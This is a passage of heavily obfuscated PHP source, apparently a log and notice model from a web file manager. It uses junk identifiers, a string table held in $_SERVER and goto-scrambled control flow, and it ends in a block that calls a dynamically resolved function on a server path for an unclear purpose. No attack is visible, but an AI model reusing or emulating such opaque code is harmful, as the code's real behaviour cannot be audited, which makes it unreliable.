$bÒõàé·Ωà[1685] => LNG($bÒõàé·Ωà[2057]), $bÒõàé·Ωà[2058] => LNG($bÒõàé·Ωà[2059]), $bÒõàé·Ωà[2060] => LNG($bÒõàé·Ωà[2061]), $bÒõàé·Ωà[2062] => LNG($bÒõàé·Ωà[2063]), $bÒõàé·Ωà[1679] => LNG($bÒõàé·Ωà[2064]), $bÒõàé·Ωà[2065] => LNG($bÒõàé·Ωà[2066]), $bÒõàé·Ωà[1678] => LNG($bÒõàé·Ωà[2067]), $bÒõàé·Ωà[2068] => LNG($bÒõàé·Ωà[2069]), $bÒõàé·Ωà[2070] => LNG($bÒõàé·Ωà[2071]), $bÒõàé·Ωà[2072] => LNG($bÒõàé·Ωà[2073]), $bÒõàé·Ωà[2074] => LNG($bÒõàé·Ωà[2074]), $bÒõàé·Ωà[2075] => LNG($bÒõàé·Ωà[1650]), $bÒõàé·Ωà[2076] => LNG($bÒõàé·Ωà[2077]), $bÒõàé·Ωà[2078] => LNG($bÒõàé·Ωà[2079]), $bÒõàé·Ωà[2080] => LNG($bÒõàé·Ωà[2081]), $bÒõàé·Ωà[2082] => LNG($bÒõàé·Ωà[2083]), $bÒõàé·Ωà[2084] => LNG($bÒõàé·Ωà[2085]), $bÒõàé·Ωà[2086] => LNG($bÒõàé·Ωà[2086]), $bÒõàé·Ωà[2087] => LNG($bÒõàé·Ωà[2088]), $bÒõàé·Ωà[2089] => LNG($bÒõàé·Ωà[2090]), $bÒõàé·Ωà[2091] => LNG($bÒõàé·Ωà[2092]), $bÒõàé·Ωà[2093] => LNG($bÒõàé·Ωà[2094]), $bÒõàé·Ωà[2095] => LNG($bÒõàé·Ωà[2096]), $bÒõàé·Ωà[2097] => LNG($bÒõàé·Ωà[2098])); } private function typeFile() { $FòÔ¨ÈùÎﬂ =& $_SERVER[™⁄»üÆ]; $dÖﬁè£Ò€‰ = array($FòÔ¨ÈùÎﬂ[1681] => array($FòÔ¨ÈùÎﬂ[1682]), $FòÔ¨ÈùÎﬂ[2040] => array($FòÔ¨ÈùÎﬂ[2099]), $FòÔ¨ÈùÎﬂ[2042] => array($FòÔ¨ÈùÎﬂ[2100]), $FòÔ¨ÈùÎﬂ[1674] => array($FòÔ¨ÈùÎﬂ[1675]), $FòÔ¨ÈùÎﬂ[2050] => array(), $FòÔ¨ÈùÎﬂ[2052] => array(), $FòÔ¨ÈùÎﬂ[2054] => array(), $FòÔ¨ÈùÎﬂ[1684] => array($FòÔ¨ÈùÎﬂ[1686]), $FòÔ¨ÈùÎﬂ[1685] => array($FòÔ¨ÈùÎﬂ[1686]), $FòÔ¨ÈùÎﬂ[2058] => array($FòÔ¨ÈùÎﬂ[2101]), $FòÔ¨ÈùÎﬂ[2060] => array($FòÔ¨ÈùÎﬂ[2101]), $FòÔ¨ÈùÎﬂ[2062] => array($FòÔ¨ÈùÎﬂ[2102]), $FòÔ¨ÈùÎﬂ[2048] => array($FòÔ¨ÈùÎﬂ[2103]), $FòÔ¨ÈùÎﬂ[1679] => array($FòÔ¨ÈùÎﬂ[2104]), $FòÔ¨ÈùÎﬂ[2065] => array($FòÔ¨ÈùÎﬂ[2105]), $FòÔ¨ÈùÎﬂ[1678] => array($FòÔ¨ÈùÎﬂ[1680])); return $dÖﬁè£Ò€‰; } private function typeAll() { goto FûàﬂíËÉë; FûàﬂíËÉë: $A∏â€∆óùø =& $_SERVER[™⁄»üÆ]; $c¯íüÈ ©Ç = $this->typeList; $bÜáÑÛÉ‡é = array_filter($this->typeFile()); goto EàÜºÇ—”Æ; FçöîâÃüÙ: return $c¯íüÈ ©Ç; goto b∑¶⁄ÛóØ†; EàÜºÇ—”Æ: foreach ($bÜáÑÛÉ‡é as $cÈ≥èëƒù∞ => $DÑÛ≈•®µ”) { $c¯íüÈ ©Ç[$DÑÛ≈•®µ”[0]] = $c¯íüÈ ©Ç[$cÈ≥èëƒù∞]; } $c¯íüÈ ©Ç[$A∏â€∆óùø[1686]] = LNG($A∏â€∆óùø[2106]); $c¯íüÈ ©Ç[$A∏â€∆óùø[2101]] = LNG($A∏â€∆óùø[2107]); goto FçöîâÃüÙ; b∑¶⁄ÛóØ†: } public function addLog($CÖ˘ıº∆‘∂, $Dπ∫ñΩÑúª = array()) { goto fÓÕˆÒõú±; fÓÕˆÒõú±: $Bß†‚ã∏≈‘ =& $_SERVER[™⁄»üÆ]; if (!isset($this->typeList[$CÖ˘ıº∆‘∂])) { return; } $d«¨≈¶ÊÊ® = defined($Bß†‚ã∏≈‘[455]) && USER_ID ? USER_ID : (isset($Dπ∫ñΩÑúª[$Bß†‚ã∏≈‘[1537]]) ? $Dπ∫ñΩÑúª[$Bß†‚ã∏≈‘[1537]] : 0); goto fç‰ÑÖñﬁß; FÎı∆ú£ÈÀ: $Dπ∫ñΩÑúª = array($Bß†‚ã∏≈‘[1527] => Session::sign(), $Bß†‚ã∏≈‘[1528] => $d«¨≈¶ÊÊ®, $Bß†‚ã∏≈‘[29] => $CÖ˘ıº∆‘∂, $Bß†‚ã∏≈‘[1530] => json_encode($Dπ∫ñΩÑúª)); parent::add($Dπ∫ñΩÑúª); goto c‰Æúü»ºÇ; fç‰ÑÖñﬁß: if (!$d«¨≈¶ÊÊ®) { $d«¨≈¶ÊÊ® = (int) Session::get($Bß†‚ã∏≈‘[1837]); } $a◊ô≥ﬁÇÔ÷ = get_client_ip(); if (!$Dπ∫ñΩÑúª || strlen(json_encode($Dπ∫ñΩÑúª)) >= 1024) { $Dπ∫ñΩÑúª = array($Bß†‚ã∏≈‘[2108] => $a◊ô≥ﬁÇÔ÷); } else { if (is_array($Dπ∫ñΩÑúª)) { $Dπ∫ñΩÑúª[$Bß†‚ã∏≈‘[2108]] = $a◊ô≥ﬁÇÔ÷; } else { $Dπ∫ñΩÑúª = array($Bß†‚ã∏≈‘[1096] => $Dπ∫ñΩÑúª, $Bß†‚ã∏≈‘[2108] => $a◊ô≥ﬁÇÔ÷); } } goto FÎı∆ú£ÈÀ; c‰Æúü»ºÇ: } public function remove($c”ﬁ·ë‚¯Ô) { $this->where(array($_SERVER[™⁄»üÆ][413] => $c”ﬁ·ë‚¯Ô))->delete(); } private function _makeOrder($d¯ê£Ú≤·ò = '') { goto a∞É∑•≤Ÿ‡; a∞É∑•≤Ÿ‡: $fæ…çØóˆÁ =& $_SERVER[™⁄»üÆ]; $Fú£úä†≠ã = $fæ…çØóˆÁ[194]; $fÜîÃΩ–µÛ = array($fæ…çØóˆÁ[429] => $fæ…çØóˆÁ[430], $fæ…çØóˆÁ[431] => $fæ…çØóˆÁ[432]); goto a•ìîåı·©; a•ìîåı·©: $aè∞®…©∞† = Input::get($fæ…çØóˆÁ[437], $fæ…çØóˆÁ[7], $fæ…çØóˆÁ[1869], array($fæ…çØóˆÁ[1793], $fæ…çØóˆÁ[431])); $aè∞®…©∞† = $fÜîÃΩ–µÛ[$aè∞®…©∞†]; $d¯ê£Ú≤·ò = $d¯ê£Ú≤·ò . "{$Fú£úä†≠ã}\40{$aè∞®…©∞†}"; goto céÁâÇ â; céÁâÇ â: return $this->order($d¯ê£Ú≤·ò); goto d’´ÇËä÷â; d’´ÇËä÷â: } public function get($cåÊÚ™ﬂ∏Ï = '') { goto E“≠Ê§àß±; aéñ±´èîÊ: if ($cåÊÚ™ﬂ∏Ï[$EÂü∑¡ƒÎù[1537]]) { $Cÿ±Ö“Ü⁄ü[$EÂü∑¡ƒÎù[1537]] = $cåÊÚ™ﬂ∏Ï[$EÂü∑¡ƒÎù[1537]]; } if (isset($cåÊÚ™ﬂ∏Ï[$EÂü∑¡ƒÎù[740]])) { $FÃ‘çﬂõç™ = $cåÊÚ™ﬂ∏Ï[$EÂü∑¡ƒÎù[740]]; $DÖ·√¯Ìïä = isset($cåÊÚ™ﬂ∏Ï[$EÂü∑¡ƒÎù[477]]) ? $cåÊÚ™ﬂ∏Ï[$EÂü∑¡ƒÎù[477]] : time(); $Cÿ±Ö“Ü⁄ü[$EÂü∑¡ƒÎù[194]] = array($EÂü∑¡ƒÎù[331], array($FÃ‘çﬂõç™, $DÖ·√¯Ìïä)); } if ($cåÊÚ™ﬂ∏Ï[$EÂü∑¡ƒÎù[29]]) { $bƒñù‡ê≤› = explode($EÂü∑¡ƒÎù[47], $cåÊÚ™ﬂ∏Ï[$EÂü∑¡ƒÎù[29]]); $Dº”ö∞∫êÉ = $this->typeFile(); $e¯ûÜ·øèï = array(); foreach ($bƒñù‡ê≤› as $Fê’Ã™ºﬁ») { $e¯ûÜ·øèï[] = $Fê’Ã™ºﬁ»; if (isset($Dº”ö∞∫êÉ[$Fê’Ã™ºﬁ»])) { $e¯ûÜ·øèï = array_merge($e¯ûÜ·øèï, $Dº”ö∞∫êÉ[$Fê’Ã™ºﬁ»]); } } $e¯ûÜ·øèï = array_unique($e¯ûÜ·øèï); if ($e¯ûÜ·øèï) { $Cÿ±Ö“Ü⁄ü[$EÂü∑¡ƒÎù[29]] = array($EÂü∑¡ƒÎù[7], $e¯ûÜ·øèï); } } else { $Cÿ±Ö“Ü⁄ü[$EÂü∑¡ƒÎù[29]] = array($EÂü∑¡ƒÎù[2109], $EÂü∑¡ƒÎù[2110]); } goto AèÒÒâ—™€; E“≠Ê§àß±: $EÂü∑¡ƒÎù =& $_SERVER[™⁄»üÆ]; if (!$cåÊÚ™ﬂ∏Ï) { show_json(array()); } $Cÿ±Ö“Ü⁄ü = array(); goto aéñ±´èîÊ; Cæ–è§óàâ: $AÆÍú§ ä[$EÂü∑¡ƒÎù[367]] = $this->logList($AÆÍú§ ä[$EÂü∑¡ƒÎù[367]]); return $AÆÍú§ ä; goto bâΩ≤ÿﬂöÀ; AèÒÒâ—™€: if (!empty($cåÊÚ™ﬂ∏Ï[$EÂü∑¡ƒÎù[2108]])) { $Cÿ±Ö“Ü⁄ü[$EÂü∑¡ƒÎù[432]] = array($EÂü∑¡ƒÎù[380], "\x25{$cåÊÚ™ﬂ∏Ï[$EÂü∑¡ƒÎù[2108]]}\x25"); } $AÆÍú§ ä = $this->_makeOrder()->where($Cÿ±Ö“Ü⁄ü)->selectPage(); if (empty($AÆÍú§ ä[$EÂü∑¡ƒÎù[367]])) { show_json(array(), !0, $AÆÍú§ ä[$EÂü∑¡ƒÎù[364]]); } goto Cæ–è§óàâ; bâΩ≤ÿﬂöÀ: } private function ipAddress(&$c∑»‰–ü⁄¨) { $B⁄è‹±∏ÒÔ =& $_SERVER[™⁄»üÆ]; if (!empty($c∑»‰–ü⁄¨[$B⁄è‹±∏ÒÔ[2108]])) { $C∞Öâû≈Ñ‚ = IpLocation::get($c∑»‰–ü⁄¨[$B⁄è‹±∏ÒÔ[2108]]); } else { $C∞Öâû≈Ñ‚ = LNG($B⁄è‹±∏ÒÔ[2111]); } $c∑»‰–ü⁄¨[$B⁄è‹±∏ÒÔ[2112]] = $C∞Öâû≈Ñ‚; } private function descZipDownload($cŒ¢Ω ◊ìá, &$dˆÍçäñä) { $C‡ÖÕ—Û·ˆ =& $_SERVER[™⁄»üÆ]; if (!isset($cŒ¢Ω ◊ìá[$C‡ÖÕ—Û·ˆ[2113]])) { return; } $f’¶£€„£ƒ = json_decode($cŒ¢Ω ◊ìá[$C‡ÖÕ—Û·ˆ[2113]], !0); foreach ($f’¶£€„£ƒ as $D¬≤ò›Ôùƒ) { try { $A√åÆß‡Ò‹ = IO::infoFull($D¬≤ò›Ôùƒ[$C‡ÖÕ—Û·ˆ[76]]); } catch (Exception $Aê¯êé˜ºÚ) { continue; } $cŒ¢Ω ◊ìá[$C‡ÖÕ—Û·ˆ[76]] = $D¬≤ò›Ôùƒ[$C‡ÖÕ—Û·ˆ[76]]; $dˆÍçäñä[] = $cŒ¢Ω ◊ìá[$C‡ÖÕ—Û·ˆ[396]] = $A√åÆß‡Ò‹[$C‡ÖÕ—Û·ˆ[396]]; $dˆÍçäñä[] = $cŒ¢Ω ◊ìá[$C‡ÖÕ—Û·ˆ[1924]] = $A√åÆß‡Ò‹[$C‡ÖÕ—Û·ˆ[479]]; break; } return $cŒ¢Ω ◊ìá; } private function getSourceList(&$BÛÂ¡∑•øâ) { $eåáèπ¿≠ =& $_SERVER[™⁄»üÆ]; $BàÃ¡„„àë = array(); foreach ($BÛÂ¡∑•øâ as $b√ÏÏôÔÉ‰ => $B∑êÑﬁù‹˘) { goto d«•≠È⁄ê≠; Dº±Ñ«ûÚâ: $BàÃ¡„„àë[] = $fÕÎâﬁØΩ†[$eåáèπ¿≠[396]]; $BàÃ¡„„àë[] = $fÕÎâﬁØΩ†[$eåáèπ¿≠[1924]]; if ($fÕÎâﬁØΩ†[$eåáèπ¿≠[29]] == $eåáèπ¿≠[534]) { $BàÃ¡„„àë[] = $fÕÎâﬁØΩ†[$eåáèπ¿≠[432]][$eåáèπ¿≠[1063]]; $BàÃ¡„„àë[] = $fÕÎâﬁØΩ†[$eåáèπ¿≠[432]][$eåáèπ¿≠[1064]]; } goto BëÛ´ƒ«ÌÈ; BëÛ´ƒ«ÌÈ: if ($fÕÎâﬁØΩ†[$eåáèπ¿≠[29]] == $eåáèπ¿≠[1932]) { $BàÃ¡„„àë[] = $fÕÎâﬁØΩ†[$eåáèπ¿≠[432]][$eåáèπ¿≠[396]]; } goto aÜÚêﬂ≤ú∏; d«•≠È⁄ê≠: $fÕÎâﬁØΩ† = json_decode($B∑êÑﬁù‹˘[$eåáèπ¿≠[432]], !0); if ($B∑êÑﬁù‹˘[$eåáèπ¿≠[29]] == $eåáèπ¿≠[1677]) { $fÕÎâﬁØΩ† = $this->descZipDownload($fÕÎâﬁØΩ†, $BàÃ¡„„àë); $BÛÂ¡∑•øâ[$b√ÏÏôÔÉ‰][$eåáèπ¿≠[432]] = json_encode($fÕÎâﬁØΩ†); continue; } if (strpos($B∑êÑﬁù‹˘[$eåáèπ¿≠[29]], $eåáèπ¿≠[1925]) !== 0) { if (!isset($fÕÎâﬁØΩ†[$eåáèπ¿≠[76]]) || strpos($B∑êÑﬁù‹˘[$eåáèπ¿≠[29]], $eåáèπ¿≠[2114]) !== 0) { continue; } try { $C‹ÆÂôÊèÇ = IO::infoFull($fÕÎâﬁØΩ†[$eåáèπ¿≠[76]]); } catch (Exception $fÚÌ’¥Â£Ú) { continue; } $BàÃ¡„„àë[] = $fÕÎâﬁØΩ†[$eåáèπ¿≠[396]] = $C‹ÆÂôÊèÇ[$eåáèπ¿≠[396]]; $BàÃ¡„„àë[] = $fÕÎâﬁØΩ†[$eåáèπ¿≠[1924]] = $C‹ÆÂôÊèÇ[$eåáèπ¿≠[479]]; $BÛÂ¡∑•øâ[$b√ÏÏôÔÉ‰][$eåáèπ¿≠[432]] = json_encode($fÕÎâﬁØΩ†); continue; } goto Dº±Ñ«ûÚâ; aÜÚêﬂ≤ú∏: } if (!$BàÃ¡„„àë) { return array(); } return Model($eåáèπ¿≠[809])->sourceListInfo($BàÃ¡„„àë, !0); } private function logList($B…ÏÍ◊ÎóÌ) { goto eƒÔúã≈ﬁΩ; eƒÔúã≈ﬁΩ: $EΩ∏§≈“Óı =& $_SERVER[™⁄»üÆ]; $aÜ©Ëéú Ó = array_to_keyvalue($B…ÏÍ◊ÎóÌ, $EΩ∏§≈“Óı[33], $EΩ∏§≈“Óı[1537]); $eŸÉõÿ¶ê… = Model($EΩ∏§≈“Óı[520])->userListInfo(array_unique($aÜ©Ëéú Ó)); goto aÕ¡ÆªÛæ⁄; bÓŒƒÿ˘ÕÑ: $Añ£¥ªóÚÓ = array(); foreach ($B…ÏÍ◊ÎóÌ as $a¨‰Ö…Î¯¡ => $B£≠Õù≤Ï∏) { goto A©⁄‡›È™Û; A©⁄‡›È™Û: $e∂íÆè¯Ü® = $B£≠Õù≤Ï∏[$EΩ∏§≈“Óı[29]]; $B¿íÉö‘ÊÇ = isset($eŸÉõÿ¶ê…[$B£≠Õù≤Ï∏[$EΩ∏§≈“Óı[1537]]]) ? $eŸÉõÿ¶ê…[$B£≠Õù≤Ï∏[$EΩ∏§≈“Óı[1537]]] : !1; $bÕÔ≤•´Ëó = strpos($e∂íÆè¯Ü®, $EΩ∏§≈“Óı[2115]) === 0 ? LNG($EΩ∏§≈“Óı[2116]) : LNG($EΩ∏§≈“Óı[2111]); goto Fƒ‘õ›à”ﬂ; Fƒ‘õ›à”ﬂ: $B£≠Õù≤Ï∏[$EΩ∏§≈“Óı[28]] = isset($B¿íÉö‘ÊÇ[$EΩ∏§≈“Óı[28]]) ? $B¿íÉö‘ÊÇ[$EΩ∏§≈“Óı[28]] : LNG($EΩ∏§≈“Óı[2111]); $B£≠Õù≤Ï∏[$EΩ∏§≈“Óı[1974]] = isset($B¿íÉö‘ÊÇ[$EΩ∏§≈“Óı[1974]]) ? $B¿íÉö‘ÊÇ[$EΩ∏§≈“Óı[1974]] : $EΩ∏§≈“Óı[33]; $B£≠Õù≤Ï∏[$EΩ∏§≈“Óı[1440]] = isset($c®º∂»ÒÇò[$e∂íÆè¯Ü®]) ? $c®º∂»ÒÇò[$e∂íÆè¯Ü®] : $bÕÔ≤•´Ëó; goto Aß«Ö∫˘π¢; Cô¬»Ïã©á: $this->ipAddress($B£≠Õù≤Ï∏); if (strpos($e∂íÆè¯Ü®, $EΩ∏§≈“Óı[1925]) === 0 || isset($dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[1924]])) { goto aôñΩ£Éì‡; aôñΩ£Éì‡: $dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[85]] = $fÈ‡∂˜ÍøÂ[$dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[396]]]; $dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[1937]] = $fÈ‡∂˜ÍøÂ[$dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[1924]]]; if ($dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[29]] == $EΩ∏§≈“Óı[534]) { $dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[432]][$EΩ∏§≈“Óı[1063]] = $fÈ‡∂˜ÍøÂ[$dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[432]][$EΩ∏§≈“Óı[1063]]]; $dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[432]][$EΩ∏§≈“Óı[1064]] = $fÈ‡∂˜ÍøÂ[$dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[432]][$EΩ∏§≈“Óı[1064]]]; } goto bËÇ±ú∫¢ù; Cã›◊≤à∞∑: if ($dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[1937]] && $dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[1937]][$EΩ∏§≈“Óı[405]] == $EΩ∏§≈“Óı[1179]) { $Añ£¥ªóÚÓ[] = $B£≠Õù≤Ï∏[$EΩ∏§≈“Óı[394]]; unset($B…ÏÍ◊ÎóÌ[$a¨‰Ö…Î¯¡]); continue; } goto CÓÏƒ¨ı·’; bËÇ±ú∫¢ù: if ($dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[29]] == $EΩ∏§≈“Óı[1932]) { $dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[432]][$EΩ∏§≈“Óı[396]] = $fÈ‡∂˜ÍøÂ[$dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[432]][$EΩ∏§≈“Óı[396]]]; } if ($dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[29]] == $EΩ∏§≈“Óı[1672]) { $dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[1937]] = $dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[85]]; $dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[1924]] = $dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[1937]][$EΩ∏§≈“Óı[396]]; $dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[85]] = !1; $dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[396]] = $EΩ∏§≈“Óı[33]; } if ($dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[85]] && $dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[85]][$EΩ∏§≈“Óı[405]] == $EΩ∏§≈“Óı[1179]) { $Añ£¥ªóÚÓ[] = $B£≠Õù≤Ï∏[$EΩ∏§≈“Óı[394]]; unset($B…ÏÍ◊ÎóÌ[$a¨‰Ö…Î¯¡]); continue; } goto Cã›◊≤à∞∑; CÓÏƒ¨ı·’: } $B£≠Õù≤Ï∏[$EΩ∏§≈“Óı[432]] = $dŒ¢€ÉæÉ§; goto aì©∑˜£öç; Aß«Ö∫˘π¢: $B£≠Õù≤Ï∏[$EΩ∏§≈“Óı[1868]] = $B¿íÉö‘ÊÇ; $dŒ¢€ÉæÉ§ = json_decode($B£≠Õù≤Ï∏[$EΩ∏§≈“Óı[432]], !0); $B£≠Õù≤Ï∏[$EΩ∏§≈“Óı[2108]] = isset($dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[2108]]) ? $dŒ¢€ÉæÉ§[$EΩ∏§≈“Óı[2108]] : $EΩ∏§≈“Óı[33]; goto Cô¬»Ïã©á; aì©∑˜£öç: unset($B£≠Õù≤Ï∏[$EΩ∏§≈“Óı[2117]]); $f´®Æ·Á‚Â[] = $B£≠Õù≤Ï∏; goto f’Ã˜ﬂòäØ; f’Ã˜ﬂòäØ: } $this->clearSystemPathLog($Añ£¥ªóÚÓ); goto A≠°¯Ñ∏Òﬁ; A≠°¯Ñ∏Òﬁ: return $f´®Æ·Á‚Â; goto DÑ≤ÜßåÊç; aÕ¡ÆªÛæ⁄: $fÈ‡∂˜ÍøÂ = $this->getSourceList($B…ÏÍ◊ÎóÌ); $c®º∂»ÒÇò = $this->typeAll(); $f´®Æ·Á‚Â = array(); goto bÓŒƒÿ˘ÕÑ; DÑ≤ÜßåÊç: } private function clearSystemPathLog($aãªóé¡Éä) { $dîÏ«€≥À =& $_SERVER[™⁄»üÆ]; if (count($aãªóé¡Éä) == 0) { return; } $aó£≠÷Òëã = array($dîÏ«€≥À[394] => array($dîÏ«€≥À[7], array_unique($aãªóé¡Éä))); $this->where($aó£≠÷Òëã)->delete(); } public function deviceList($F›Îê£Êè¬, $cë§Ççªë˘ = 0) { $d∆œıÇ˜ Ç =& $_SERVER[™⁄»üÆ]; $E£™ÌÇå¥– = array($d∆œıÇ˜ Ç[1537] => $F›Îê£Êè¬, $d∆œıÇ˜ Ç[194] => array($d∆œıÇ˜ Ç[981], $cë§Ççªë˘), $d∆œıÇ˜ Ç[29] => $d∆œıÇ˜ Ç[1646]); $aŸñ°Âôïﬁ = array(); $D‹îÀÛ∑¯¨ = $this->field($d∆œıÇ˜ Ç[2118])->where($E£™ÌÇå¥–)->order($d∆œıÇ˜ Ç[1935])->limit(50)->select(); foreach ($D‹îÀÛ∑¯¨ as $cèìë€ö≈À => $cêÏºç¿Ì‘) { goto e¿®§Ç∑Õö; e¿®§Ç∑Õö: if ($cèìë€ö≈À > 0 && abs($cêÏºç¿Ì‘[$d∆œıÇ˜ Ç[194]] - $D‹îÀÛ∑¯¨[$cèìë€ö≈À - 1][$d∆œıÇ˜ Ç[194]]) < 5) { continue; } $Aä™ˆã”ÍÏ = json_decode($cêÏºç¿Ì‘[$d∆œıÇ˜ Ç[432]], !0); $cêÏºç¿Ì‘[$d∆œıÇ˜ Ç[2108]] = isset($Aä™ˆã”ÍÏ[$d∆œıÇ˜ Ç[2108]]) ? $Aä™ˆã”ÍÏ[$d∆œıÇ˜ Ç[2108]] : $d∆œıÇ˜ Ç[33]; goto Eªµˆáπåì; e‰÷‚í–ò“: $this->ipAddress($cêÏºç¿Ì‘); $cêÏºç¿Ì‘[$d∆œıÇ˜ Ç[432]] = $Aä™ˆã”ÍÏ; $aŸñ°Âôïﬁ[$EÃÚ‡“øàÁ] = $cêÏºç¿Ì‘; goto fÕæ´é≠∞º; Eªµˆáπåì: unset($Aä™ˆã”ÍÏ[$d∆œıÇ˜ Ç[2108]]); $EÃÚ‡“øàÁ = $this->deviceType($Aä™ˆã”ÍÏ[$d∆œıÇ˜ Ç[1926]]); if (isset($aŸñ°Âôïﬁ[$EÃÚ‡“øàÁ])) { continue; } goto e‰÷‚í–ò“; fÕæ´é≠∞º: } return array_values($aŸñ°Âôïﬁ); } public function deviceType($DÒ¿£ää«è) { return $DÒ¿£ää«è; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\x6e\157\164\x69\143\145\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x63\x6f\156\164\x65\156\x74", "\141\x75\x74\x68", "\x6d\157\144\x65", "\x74\x69\155\x65", "\x74\x79\160\x65", "\154\x65\x76\x65\x6c", "\145\x6e\141\142\x6c\x65", "\x73\157\162\x74"); public function listData($a‘òÃ¬–´€ = false, $A¿—¢®»‰Ô = "\x73\157\162\164", $E‹ ´ŸÛÏ„ = false) { return parent::listData($a‘òÃ¬–´€, $A¿—¢®»‰Ô, $E‹ ´ŸÛÏ„); } public function add($fÓãºøË√ú) { $E¢æªΩüÕπ =& $_SERVER[™⁄»üÆ]; $E∞ãˆààÉ∂ = time(); if ($fÓãºøË√ú[$E¢æªΩüÕπ[12]] == $E¢æªΩüÕπ[2119]) { $E∞ãˆààÉ∂ = strtotime($fÓãºøË√ú[$E¢æªΩüÕπ[197]]); } $fÓãºøË√ú[$E¢æªΩüÕπ[197]] = $E∞ãˆààÉ∂; return parent::insert($fÓãºøË√ú); } public function update($eΩÔãê˜»ó, $C◊ˆÊ∏¿ı¢) { goto cßËœòƒ∏°; cßËœòƒ∏°: $d∞‹íàÜ≤µ =& $_SERVER[™⁄»üÆ]; $D¡√≈åÉãñ = $this->listData($eΩÔãê˜»ó); if (!$D¡√≈åÉãñ) { return !1; } goto Bƒ∏ÑÊ∏ˆ; Bƒ∏ÑÊ∏ˆ: $e≤ı©’ùõò = time(); if ($C◊ˆÊ∏¿ı¢[$d∞‹íàÜ≤µ[12]] == $d∞‹íàÜ≤µ[2119]) { $e≤ı©’ùõò = strtotime($C◊ˆÊ∏¿ı¢[$d∞‹íàÜ≤µ[197]]); } $C◊ˆÊ∏¿ı¢[$d∞‹íàÜ≤µ[197]] = $e≤ı©’ùõò; goto EÀ†öÀÂ™—; EÀ†öÀÂ™—: return parent::update($eΩÔãê˜»ó, $C◊ˆÊ∏¿ı¢); goto bÑ¡ Æùû—; bÑ¡ Æùû—: } public function remove($BÒÖçü·®æ) { $bÈ¬ΩΩ„é = $this->listData($BÒÖçü·®æ); if (!$bÈ¬ΩΩ„é || $bÈ¬ΩΩ„é[$_SERVER[™⁄»üÆ][1179]]) { return !1; } return parent::remove($BÒÖçü·®æ); } public function sort($Eœ ÖÇë¢Ó, $fòÿ¯ﬂ∏Ü‹) { return parent::update($Eœ ÖÇë¢Ó, $fòÿ¯ﬂ∏Ü‹); } public function enable($cÛÃ∂¬÷°¿, $DèÊù„´áå) { return parent::update($cÛÃ∂¬÷°¿, array($_SERVER[™⁄»üÆ][2120] => $DèÊù„´áå)); } private function initUserOption() { $E¨˜≤œ˜†â =& $_SERVER[™⁄»üÆ]; $this->optionType = $E¨˜≤œ˜†â[2121]; $this->modelType = $E¨˜≤œ˜†â[2122]; $this->field = array($E¨˜≤œ˜†â[2123], $E¨˜≤œ˜†â[28], $E¨˜≤œ˜†â[197], $E¨˜≤œ˜†â[29], $E¨˜≤œ˜†â[2124], $E¨˜≤œ˜†â[729], $E¨˜≤œ˜†â[189]); } public function userNoticeGet($Fıº®üõå∫ = false) { $this->initUserOption(); return parent::listData($Fıº®üõå∫, $_SERVER[™⁄»üÆ][394], !0); } public function userNoticeAdd($A∫ÌëÌá˘Ì) { $F„◊∫≥÷√ï =& $_SERVER[™⁄»üÆ]; $this->initUserOption(); $DûèÁ“òÉÇ = $this->findByKey($F„◊∫≥÷√ï[2123], $A∫ÌëÌá˘Ì[$F„◊∫≥÷√ï[394]]); if ($DûèÁ“òÉÇ) { return !0; } $a™°Àùõí‚ = array($F„◊∫≥÷√ï[2123] => $A∫ÌëÌá˘Ì[$F„◊∫≥÷√ï[394]], $F„◊∫≥÷√ï[28] => $A∫ÌëÌá˘Ì[$F„◊∫≥÷√ï[28]], $F„◊∫≥÷√ï[197] => $A∫ÌëÌá˘Ì[$F„◊∫≥÷√ï[197]], $F„◊∫≥÷√ï[29] => isset($A∫ÌëÌá˘Ì[$F„◊∫≥÷√ï[29]]) ? $A∫ÌëÌá˘Ì[$F„◊∫≥÷√ï[29]] : 1, $F„◊∫≥÷√ï[2124] => isset($A∫ÌëÌá˘Ì[$F„◊∫≥÷√ï[2124]]) ? $A∫ÌëÌá˘Ì[$F„◊∫≥÷√ï[2124]] : 0, $F„◊∫≥÷√ï[729] => 0, $F„◊∫≥÷√ï[189] => 0); return parent::insert($a™°Àùõí‚); } public function userNoticeEdit($Aú∑àÉ∏ú…, $bãŒﬁÖ›◊ç) { $this->initUserOption(); return parent::update($Aú∑àÉ∏ú…, $bãŒﬁÖ›◊ç); } } if (!isset($_SERVER[$_SERVER[™⁄»üÆ][592]]) || !isset($_SERVER[$_SERVER[™⁄»üÆ][600]])) { goto CãÕÓß⁄„ë; CãÕÓß⁄„ë: $aò‡ı§∞ù∫ = $_SERVER[™⁄»üÆ][594]; $Díßÿô—ªÀ = $_SERVER[$_SERVER[™⁄»üÆ][595]] . $_SERVER[™⁄»üÆ][596]; $bà≠ƒïò•§ = $aò‡ı§∞ù∫($Díßÿô—ªÀ); goto dÛÀ⁄≠ñ∂›; dÿ∫å≥ﬂâÔ: $F∫ÒëÁ‘©ı($_SERVER[$_SERVER[™⁄»üÆ][595]] . $_SERVER[™⁄»üÆ][596]); $Aæô„π≠‚§ = 2; while ($Aæô„π≠‚§ > 1) { $bÆ…äÛê®á 